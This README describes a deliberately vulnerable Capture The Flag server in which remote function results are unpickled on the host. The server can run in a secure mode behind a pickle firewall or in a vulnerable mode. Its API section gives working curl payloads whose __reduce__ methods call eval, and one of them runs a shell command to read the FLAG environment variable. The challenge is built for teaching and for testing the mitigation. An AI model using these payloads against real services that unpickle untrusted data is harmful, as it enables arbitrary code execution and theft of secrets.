# Modal CTF Challenge - Pickle Deserialization Vulnerability

This is a Capture The Flag (CTF) challenge designed to demonstrate and test the security of Modal's sandbox when dealing with pickle deserialization vulnerabilities. It now supports two modes: **SECURE** (using rfmodal with pickle firewall) and **VULNERABLE** (for CTF exploitation).

## ⚠️ WARNING
This application contains **intentional vulnerabilities** for educational and testing purposes. Do not deploy this in a production environment.

## 🆕 Two Security Modes

This CTF server can run in two modes:

### 1. **SECURE Mode** (Default)
- Uses `rfmodal` (Roboflow's fork of modal-client) with pickle firewall enabled
- `rfmodal` is available on PyPI and includes `rffickle` for safe deserialization
- Blocks malicious pickle deserialization attacks
- Challenge: Find another exploit (if one exists!)
- Start with: `./docker_start.sh secure` or just `./docker_start.sh`

### 2. **VULNERABLE Mode**
- Disables the pickle firewall for CTF demonstration
- Standard pickle deserialization attacks will work
- Original CTF challenge behavior
- Start with: `./docker_start.sh vulnerable`

## Architecture

This CTF has two components:

1. **Modal Function** (`modal_function.py`): A restricted Modal function that executes Python code in a sandboxed container
2. **Local Server** (`server.py`): A FastAPI server that runs on your VM, accepts HTTP requests, and calls the Modal function

The vulnerability (in vulnerable mode) occurs when the local server receives the pickled result from Modal and deserializes it, allowing arbitrary code execution on the host VM. In secure mode, rfmodal's firewall blocks these attacks.

## Challenge Description

The goal is to capture the flag (stored in the `FLAG` environment variable on the host VM).

- **In VULNERABLE mode**: Exploit the pickle deserialization vulnerability using the standard attacks
- **In SECURE mode**: The standard attacks are blocked - find another way (if one exists)!

## Project Structure

```
modal-ctf/
├── modal_function.py    # Modal function (runs in cloud)
├── server.py            # Local FastAPI server with rfmodal (runs on VM)
├── public/
│   └── index.html       # Web interface with CTF instructions
├── requirements.txt     # Python dependencies (includes rfmodal)
├── deploy_modal.sh      # Deploy Modal function to cloud
├── docker_start.sh      # Start Docker container with mode selection
└── README.md           # This file
```

## Quick Start

### 1. Deploy the Modal Function

```bash
./deploy_modal.sh
```

### 2. Choose Mode and Start Server

#### For SECURE mode (default):
```bash
export FLAG="CTF{your_secret_flag_here}"
./docker_start.sh
# or explicitly: ./docker_start.sh secure
```

#### For VULNERABLE mode:
```bash
export FLAG="CTF{your_secret_flag_here}"
./docker_start.sh vulnerable
```

## API

The server accepts raw Python code as the POST body (not JSON):

```bash
# Simple test - works in both modes
curl -X POST http://localhost/execute -d 'print("Hello"); 42'

# Check current mode
curl http://localhost/mode

# Health check with mode info
curl http://localhost/health
```

### Vulnerable Mode Exploits

These exploits will **ONLY** work when the server is running in vulnerable mode:

```bash
# Multi-line class definition exploit
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))

FlagExploit()
EOF

# One-liner exploit
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
EOF
```

### Secure Mode Behavior

In secure mode, the above exploits will fail with an error message indicating the pickle firewall blocked the attack:

```json
{
  "success": false,
  "error": "Failed to execute code: [rffickle error message]",
  "mode": "secure",
  "firewall_blocked": true,
  "hint": "The pickle firewall blocked your attack. This is expected in secure mode!"
}
```

## How It Works

### Vulnerable Mode Flow:
1. User submits Python code via HTTP POST to `/execute`
2. Server uses `modal.Function.from_name()` with `use_firewall=False`
3. Modal executes the code in a sandboxed container
4. Modal pickles the result to send it back
5. **VULNERABILITY**: The server unpickles without protection
6. Malicious `__reduce__` methods execute on the host

### Secure Mode Flow:
1. User submits Python code via HTTP POST to `/execute`
2. Server uses `modal.Function.from_name()` with `use_firewall=True`
3. Modal executes the code in a sandboxed container
4. Modal pickles the result to send it back
5. **PROTECTION**: rfmodal's firewall inspects the pickle stream
6. Dangerous operations are blocked before execution

## The Vulnerability & Protection

### The Pickle Vulnerability (Vulnerable Mode)

The vulnerability occurs because Modal pickles/unpickles results when returning from remote functions. Objects with malicious `__reduce__` methods execute code during unpickling.

### The rfmodal Protection (Secure Mode)

`rfmodal` integrates `rffickle` (Roboflow's fork of `fickle`) to safely deserialize pickled data:
- Inspects pickle operations before execution
- Blocks dangerous opcodes like REDUCE, BUILD, GLOBAL
- Prevents arbitrary code execution during deserialization
- No performance impact when firewall is disabled

## Testing Both Modes

```bash
# Start in vulnerable mode and test exploit
export FLAG="CTF{test_flag}"
./docker_start.sh vulnerable

# Exploit should work
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))
FlagExploit()
EOF

# Stop container
docker stop modal-ctf

# Start in secure mode
./docker_start.sh secure

# Same exploit should be blocked
curl -X POST http://localhost/execute --data-binary @- <<'EOF'
class FlagExploit:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))
FlagExploit()
EOF
```

## Environment Variables

- `FLAG`: The CTF flag to capture
- `VULNERABLE`: Set to "true" to enable vulnerable mode (handled by docker_start.sh)
- `MODAL_TOKEN_ID`: Modal authentication token
- `MODAL_TOKEN_SECRET`: Modal authentication secret

## Security Notes

- Modal function has `restrict_modal_access=True` and `block_network=True`
- The container itself is secure - vulnerability is in pickle deserialization
- In secure mode, rfmodal demonstrates how to safely handle untrusted pickled data
- This shows why untrusted data should never be unpickled without protection

## Mitigation

The `rfmodal` fork of modal-client provides the solution:
- Uses `rffickle.DefaultFirewall` for safe pickle deserialization
- Can be enabled per-function with `use_firewall=True`
- No fallback to unsafe pickle if firewall fails
- Maintains backward compatibility (opt-in security)

## Expected Behavior

### Vulnerable Mode:
- **Container execution**: Code runs as 'root' in Modal container
- **Successful exploit**: Returns the FLAG value from the host VM
- **Host info**: Shows the VM's actual hostname and username

### Secure Mode:
- **Container execution**: Code runs normally in Modal container
- **Blocked exploit**: Returns error with firewall block message
- **Challenge**: Find alternative exploits (if any exist)
